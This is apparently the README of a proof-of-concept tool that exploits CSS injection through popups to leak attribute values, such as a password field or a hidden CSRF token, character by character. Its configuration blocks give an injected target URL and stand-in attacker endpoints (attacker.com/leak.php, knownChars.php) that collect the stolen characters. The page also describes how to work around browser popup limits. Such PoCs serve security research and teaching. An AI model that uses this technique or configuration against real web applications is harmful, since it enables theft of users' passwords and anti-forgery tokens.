# PoC - CSS Injection : popups

__Read this in other languages:__ [English](README.md), [Français](README.fr.md)

## Description

PoC to exploit a CSS injection using popups to retrieve the value of an attribute of an HTML element.

## Prerequisites

- There are some limitations when the value to be retrieved starts with a number. The target value must then be surrounded by single or double quotes and exploitation may not be possible if these characters are filtered by the application.
- Since on modern browsers only one popup can be opened at a time and only as a result of a user action (e.g. click), the alpahabet must be tested in a single request that may cause a `414 URI too long` error

## Configuration

Before using the PoC, adapt the following values:

```
/* ==== CONFIG ==== */
// Full URL of the vulnerable application
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  

// URL of the attacker's machine to retrieve the already known characters
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";

// URL of the attacker's machine to indicate a new identified character
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";

// Name of the targeted HTML element
const HTML_ELEMENT_NAME = "input";

// Name of the targeted HTML attribute
const HTML_ATTRIBUTE_NAME = "name";

// NAME value of the targeted HTML attribute
const HTML_ATTRIBUTE_VALUE = "password";

// True if the targeted field is of type "hidden" (use of CSS combinators ~*)
const isHiddenTypeElement = false;

// When the characters "'" and """ are filtered by the application it's not possible to retrieve a value starting with a number
const isQuoteFiltered = true;
```

## Usage

### Retrieving a value from a password field

```javascript
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "password";
const isHiddenTypeElement = false;
const isQuoteFiltered = true;
```

### Retrieving a value from a hidden field

```javascript
const RURL = "http://vulnerable.com/targets/hidden.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "csrf-token";
const isHiddenTypeElement = true;
const isQuoteFiltered = true;
```

## Demo

### Retrieving a value from a password field

![](https://github.com/Sharpforce/PoC-CSS-injection/blob/master/attribute-selectors-popup/demo/attribute-selectors-popup-password.gif)

### Retrieving a value from a hidden field

![](https://github.com/Sharpforce/PoC-CSS-injection/blob/master/attribute-selectors-popup/demo/attribute-selectors-popup-hidden.gif)